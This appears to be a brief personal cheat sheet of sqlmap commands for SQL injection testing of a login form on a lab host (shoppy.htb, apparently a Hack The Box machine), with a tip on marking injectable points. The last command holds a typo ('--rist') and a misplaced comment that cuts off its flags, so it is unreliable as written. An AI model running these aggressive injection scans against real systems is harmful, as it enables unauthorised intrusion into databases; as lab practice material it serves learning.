```
sqlmap -r REQUEST_FILE
sqlmap -u "http://shoppy.htb/login" --data "username=admin&password=admin" --risk 3 --level 5 -f --banner --ignore-code 401 --dbms='SQL_TYPE'
```

you can add * to tell sqlmap that this place is injectable in the file request 
```
sqlmap -r REQUEST_FILE --force ssl # FOR HTTPS --rist 3 --level 5 --batch
```